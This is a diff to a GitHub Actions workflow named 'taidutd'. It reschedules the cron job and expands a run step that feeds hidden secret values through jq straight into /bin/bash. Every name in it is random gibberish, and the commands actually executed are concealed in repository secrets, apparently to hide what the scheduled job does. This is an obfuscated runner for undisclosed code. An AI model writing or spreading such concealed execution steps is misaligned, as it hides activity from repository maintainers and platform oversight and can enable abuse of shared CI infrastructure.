@@ -1,9 +1,8 @@
 name: taidutd
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 5/6 * * *'
+    - cron: '10 0/6 * * *'
 
 jobs:
   build:
@@ -12,11 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: taidutd
         env:
-          bh5: ${{ secrets.bh5 }}
+          y75654: ${{ secrets.y75654 }}
         run: |
-          echo $bh5 | jq -r .i892 | /bin/bash
-          echo $tqirv7 | jq -r .jhqbo650 | /bin/bash
-          echo $pdbf72210 | jq -r .ky81 | /bin/bash
-          echo $krhng305 | jq -r .ssafj0567 | /bin/bash
-          echo $z773 | jq -r .akzt33 | /bin/bash
+          echo $y75654 | jq -r .i5050 | /bin/bash
+          echo $qaxqw34 | jq -r .h7390 | /bin/bash
+          echo $ckxz63 | jq -r .cva8 | /bin/bash
+          echo $n46 | jq -r .bzoiv2513 | /bin/bash
+          echo $ba692 | jq -r .sxk4672 | /bin/bash
+          echo $ckb11 | jq -r .oar0 | /bin/bash
+          echo $cvmnf2504 | jq -r .o463 | /bin/bash
+          echo $nhne752 | jq -r .o36 | /bin/bash
+          echo $s54 | jq -r .kfo55467 | /bin/bash
 
